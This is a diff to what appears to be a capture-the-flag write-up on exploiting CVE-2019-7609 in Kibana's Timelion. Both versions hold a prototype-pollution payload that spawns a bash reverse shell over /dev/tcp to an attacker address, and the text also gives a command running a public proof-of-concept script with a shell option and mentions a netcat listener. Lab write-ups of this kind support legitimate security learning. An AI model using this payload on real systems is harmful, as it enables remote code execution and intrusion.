@@ -113,15 +113,15 @@ On a shell, i run a listenner on port 4444 :
 On the Timelion, we can use this payload :
 
 `
-.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/{MY_IP}/4444 0>&1");process.exit()//')
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
 `
 
-Then run the code and load the canvas page.
+Then run the code and load the canvas page. We get the reverse shell.
 
 Or we can use this [PoC](https://github.com/LandGrey/CVE-2019-7609)
 
-python2 CVE-2019-7609-kibana-rce.py -u http://10.10.223.77:5601 -host {MY_IP} -port 4444 --shell
+`python2 CVE-2019-7609-kibana-rce.py -u http://10.10.223.77:5601 -host {MY_IP} -port 4444 --shell`
 
 And we have just to wait on the listenner (previously runned with netcat)
 
